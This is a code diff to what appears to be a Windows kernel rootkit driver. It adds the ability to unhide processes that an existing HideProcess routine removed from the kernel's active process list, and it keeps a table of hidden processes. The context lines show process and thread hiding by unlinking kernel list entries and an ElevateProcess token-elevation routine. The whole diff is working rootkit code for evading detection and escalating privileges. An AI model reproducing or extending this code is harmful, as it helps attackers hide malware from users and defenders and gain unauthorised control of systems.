@@ -19,11 +19,14 @@ bool AddProcess(ULONG pid);
 bool RemoveProcess(ULONG pid);
 ULONG GetActiveProcessLinksOffset();
 ULONG GetProcessLockOffset();
+bool AddHiddenProcess(PLIST_ENTRY entry, DWORD pid);
+PLIST_ENTRY GetHiddenProcess(DWORD pid);
 UINT64 GetTokenOffset();
 NTSTATUS ElevateProcess(ULONG pid);
 ULONG GetSignatureLevelOffset();
 NTSTATUS SetProcessSignature(ProcessSignature* ProcessSignature);
 void RemoveListLinks(PLIST_ENTRY current);
+void AddListLinks(PLIST_ENTRY current, PLIST_ENTRY target);
 
 /*
 * Description:
@@ -133,11 +136,66 @@ NTSTATUS HideProcess(ULONG pid) {
 
 	// Using the ActiveProcessLinks lock to avoid accessing problems.
 	PEX_PUSH_LOCK listLock = (PEX_PUSH_LOCK)((ULONG_PTR)targetProcess + lockOffset);
+	AutoLock locker(pGlobals.Lock);
 	ExAcquirePushLockExclusive(listLock);
-	RemoveEntryList(processListEntry);
+
+	// Saving the hidden process' list entry for the future to release it.
+	if (!AddHiddenProcess(processListEntry, pid)) {
+		ExReleasePushLockExclusive(listLock);
+		ObDereferenceObject(targetProcess);
+		return STATUS_UNSUCCESSFUL;
+	}
+
+	RemoveListLinks(processListEntry);
 	ExReleasePushLockExclusive(listLock);
 	ObDereferenceObject(targetProcess);
 
+	return status;
+}
+
+/*
+* Description:
+* UnhideProcess is responsible for unhiding a hidden process by modifying the process list.
+*
+* Parameters:
+* @pid	  [ULONG]	 -- PID to unhide.
+*
+* Returns:
+* @status [NTSTATUS] -- Whether successfully hidden or not.
+*/
+NTSTATUS UnhideProcess(ULONG pid) {
+	PEPROCESS targetProcess;
+	NTSTATUS status = STATUS_SUCCESS;
+	PLIST_ENTRY entryToRestore;
+
+	AutoLock locker(pGlobals.Lock);
+	entryToRestore = GetHiddenProcess(pid);
+
+	if (!entryToRestore)
+		return STATUS_UNSUCCESSFUL;
+
+	ULONG activeProcessLinkListOffset = GetActiveProcessLinksOffset();
+	ULONG lockOffset = GetProcessLockOffset();
+
+	if (activeProcessLinkListOffset == STATUS_UNSUCCESSFUL || lockOffset == STATUS_UNSUCCESSFUL)
+		return STATUS_UNSUCCESSFUL;
+
+	status = PsLookupProcessByProcessId(ULongToHandle(SYSTEM_PROCESS_PID), &targetProcess);
+
+	if (!NT_SUCCESS(status))
+		return status;
+
+	PLIST_ENTRY processListEntry = (PLIST_ENTRY)((ULONG_PTR)targetProcess + activeProcessLinkListOffset);
+
+	// Using the ActiveProcessLinks lock to avoid accessing problems.
+	PEX_PUSH_LOCK listLock = (PEX_PUSH_LOCK)((ULONG_PTR)targetProcess + lockOffset);
+	ExAcquirePushLockExclusive(listLock);
+
+	AddListLinks(entryToRestore, processListEntry);
+
+	ExReleasePushLockExclusive(listLock);
+	ObDereferenceObject(targetProcess);
+	entryToRestore = NULL;
 	return status;
 }
 
@@ -168,11 +226,11 @@ NTSTATUS HideThread(ULONG tid) {
 	// Using the ThreadListEntry lock to avoid accessing problems.
 	PLIST_ENTRY threadListEntry = (PLIST_ENTRY)((ULONG_PTR)targetThread + threadListEntryOffset);
 	PEX_PUSH_LOCK listLock = (PEX_PUSH_LOCK)((ULONG_PTR)targetThread + lockOffset);
+
 	ExAcquirePushLockExclusive(listLock);
-
 	RemoveListLinks(threadListEntry);
-
 	ExReleasePushLockExclusive(listLock);
+
 	ObDereferenceObject(targetThread);
 	return status;
 }
@@ -211,6 +269,52 @@ NTSTATUS ElevateProcess(ULONG pid) {
 	ObDereferenceObject(privilegedProcess);
 	ObDereferenceObject(targetProcess);
 	return status;
+}
+
+/*
+* Description:
+* AddHiddenProcess is responsible for adding a hidden process to the list of hidden processes.
+*
+* Parameters:
+* @pid	  [ULONG] -- PID to add.
+*
+* Returns:
+* @status [bool]  -- Whether successfully added or not.
+*/
+bool AddHiddenProcess(PLIST_ENTRY entry, DWORD pid) {
+	for (int i = 0; i < MAX_PIDS; i++) {
+		if (pGlobals.HiddenProcesses.Processes[i].Pid == 0) {
+			pGlobals.HiddenProcesses.Processes[i].ListEntry = entry;
+			pGlobals.HiddenProcesses.Processes[i].Pid = pid;
+			pGlobals.HiddenProcesses.PidsCount++;
+			return true;
+		}
+	}
+	return false;
+}
+
+/*
+* Description:
+* GetHiddenProcess is responsible for searching if a process exists in the list of hidden processes.
+*
+* Parameters:
+* @pid	  [ULONG]	    -- PID to search.
+*
+* Returns:
+* @entry  [PLIST_ENTRY] -- If found, the process list entry.
+*/
+PLIST_ENTRY GetHiddenProcess(DWORD pid) {
+	PLIST_ENTRY entry = NULL;
+
+	for (int i = 0; i < pGlobals.HiddenProcesses.PidsCount; i++) {
+		if (pGlobals.HiddenProcesses.Processes[i].Pid == pid) {
+			entry = pGlobals.HiddenProcesses.Processes[i].ListEntry;
+			pGlobals.HiddenProcesses.Processes[i].Pid = 0;
+			pGlobals.HiddenProcesses.PidsCount--;
+			break;
+		}
+	}
+	return entry;
 }
 
 /*
@@ -520,23 +624,11 @@ ULONG GetThreadLockOffset() {
 * There is no return value.
 */
 void RemoveListLinks(PLIST_ENTRY current) {
-	PLIST_ENTRY previous, next;
+	PLIST_ENTRY previous;
+	PLIST_ENTRY next;
 
-	/*
-	* Changing the list from:
-	* Prev <--> Current <--> Next
-	*
-	* To:
-	*
-	*   | ------------------------------
-	*   v							   |
-	* Prev        Current            Next
-	*   |							   ^
-	*   -------------------------------|
-	*/
-
-	previous = (current->Blink);
-	next = (current->Flink);
+	previous = current->Blink;
+	next = current->Flink;
 
 	previous->Flink = next;
 	next->Blink = previous;
@@ -544,6 +636,28 @@ void RemoveListLinks(PLIST_ENTRY current) {
 	// Re-write the current LIST_ENTRY to point to itself (avoiding BSOD)
 	current->Blink = (PLIST_ENTRY)&current->Flink;
 	current->Flink = (PLIST_ENTRY)&current->Flink;
+}
+
+/*
+* Description:
+* AddListLinks is responsible for modifying the list by connecting an entry to specific target.
+*
+* Parameters:
+* @current [PLIST_ENTRY] -- Current process entry.
+*
+* Returns:
+* There is no return value.
+*/
+void AddListLinks(PLIST_ENTRY current, PLIST_ENTRY target) {
+	PLIST_ENTRY next;
+
+	next = target->Flink;
+
+	current->Blink = target;
+	current->Flink = next;
+
+	next->Blink = current;
+	target->Flink = current;
 }
 
 /*
